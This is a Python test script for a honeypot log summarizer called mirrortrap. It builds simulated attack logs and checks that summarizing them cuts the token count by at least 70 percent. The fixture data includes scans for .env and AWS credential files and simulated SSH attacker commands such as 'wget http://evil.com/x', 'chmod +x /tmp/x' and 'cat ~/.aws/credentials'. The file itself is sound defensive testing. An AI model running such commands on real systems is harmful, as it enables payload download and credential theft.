import sys, json
sys.path.insert(0, '.')
from mirrortrap.ai.summarizer import build_prompt_summary, estimate_token_reduction

# Simulate realistic raw logs with large HTTP header payloads
fat_header = {
    'User-Agent': 'Mozilla/5.0 (compatible; Masscan/1.3; +https://github.com/robertdavidgraham/masscan)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'X-Forwarded-For': '185.220.101.42, 10.0.0.1',
    'X-Real-IP': '185.220.101.42',
    'Host': 'target.example.com:5000',
    'Referer': 'https://shodan.io',
    'Cookie': 'session=abc123def456; csrf=xyz789; __ga=GA1.2.12345.67890',
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.long.token.here',
}

realistic_logs = []
for i in range(50):
    realistic_logs.append({
        'id': i,
        'timestamp': f'2024-01-01T12:{i//60:02d}:{i%60:02d}',
        'source_ip': '185.220.101.42',
        'service': 'HTTP',
        'attack_type': ['env_exposure_scan', 'aws_credentials_scan', 'wordpress_scan'][i % 3],
        'payload': json.dumps({
            'headers': fat_header,
            'args': {},
            'form': {},
            'data': '',
            'method': 'GET',
            'path': ['/.env', '/.aws/credentials', '/wp-admin'][i % 3],
        })
    })

# Also add SSH session rows with commands
for i in range(20):
    realistic_logs.append({
        'ip_address': '91.108.4.211',
        'command': ['uname -a', 'id', 'cat /etc/passwd', 'wget http://evil.com/x', 'chmod +x /tmp/x', 'cat ~/.aws/credentials'][i % 6],
        'session_id': 'sess-abc',
        'timestamp': f'2024-01-01T13:{i//60:02d}:{i%60:02d}',
    })

original_chars = len(json.dumps(realistic_logs))
summary = build_prompt_summary(realistic_logs)
summary_chars = len(json.dumps(summary))
reduction = estimate_token_reduction(realistic_logs, summary)

print(f'[REALISTIC TEST]')
print(f'  Original rows:  {len(realistic_logs)}')
print(f'  Original chars: {original_chars:,}')
print(f'  Summary chars:  {summary_chars:,}')
print(f'  Reduction:      {reduction}%')
print(f'  Unique IPs:     {summary["unique_ips"]}')
print(f'  Goal:           >=70%  ->  {"PASS" if reduction >= 70 else "FAIL"}')
